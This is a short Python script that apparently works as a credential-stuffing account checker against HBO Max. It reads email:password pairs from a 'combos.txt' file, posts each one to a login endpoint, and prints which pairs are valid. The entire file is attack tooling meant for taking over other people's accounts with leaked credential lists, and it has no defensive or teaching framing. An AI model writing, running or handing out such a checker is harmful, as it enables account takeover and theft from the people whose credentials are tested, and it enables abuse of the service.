from requests import Session
import json

def check(email:str, password:str):
    try:
        with Session() as s:
            # login request
            response = s.post(
                'https://play.hbomax.com/dingbats/ghost',
                headers={
                    "Content-Type": "application/json",
                    "x-hbo-platform": "WEB"
                },
                data=json.dumps({
                    "email": email,
                    "password": password
                })
            )
            response.raise_for_status()

            user_data = response.json()
            if user_data.get('status') == 'authenticated':
                print(f'Valid: {email}:{password}')
            else:
                print(f'Invalid: {email}:{password}')
    except Exception as e:
        print(f'Error occurred while checking {email}:{password} -> {str(e)}')

def main():
    with open('combos.txt', 'r') as f:
        for line in f:
            email, password = line.strip().split(':')
            check(email, password)

if __name__ == "__main__":
    main()
